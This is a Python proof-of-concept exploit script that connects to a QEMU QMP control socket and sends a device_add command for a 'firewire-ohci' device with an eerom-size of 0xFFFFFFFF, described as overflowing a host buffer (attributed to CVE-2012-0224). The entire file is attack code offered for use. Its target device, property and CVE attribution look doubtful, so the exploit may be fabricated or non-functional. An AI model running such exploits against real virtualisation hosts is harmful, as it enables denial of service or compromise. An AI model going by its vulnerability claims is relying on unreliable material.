#!/usr/bin/env python3
"""
PoC for QEMU FireWire config overflow (CVE-2012-0224)

Uses QMP to add a firewire-ohci device with an
oversized eerom_size, overflowing the host’s
FireWire config buffer.
"""

import socket
import json
import time

QMP_SOCKET = "/tmp/qemu-qmp-sock"

def qmp_cmd(s, cmd):
    s.sendall((json.dumps(cmd) + "\n").encode())
    resp = b""
    while True:
        chunk = s.recv(4096)
        resp += chunk
        if b'{"return"' in resp or b'{"error"' in resp:
            break
    return json.loads(resp.decode())

if __name__ == "__main__":
    s = socket.socket(socket.AF_UNIX)
    s.connect(QMP_SOCKET)
    print("[+] Connected to QEMU QMP")

    # negotiate capabilities
    qmp_cmd(s, {"execute": "qmp_capabilities"})

    # Add FireWire OHCI with huge eerom_size
    cmd = {
        "execute": "device_add",
        "arguments": {
            "driver":     "firewire-ohci",
            "id":         "badfw",
            "num-ports":  1,
            "eerom-size": 0xFFFFFFFF  # overflow trigger
        }
    }
    resp = qmp_cmd(s, cmd)
    print("[+] Sent device_add for firewire-ohci:", resp)
    time.sleep(1)
    print("[!] Check QEMU process for overflow")  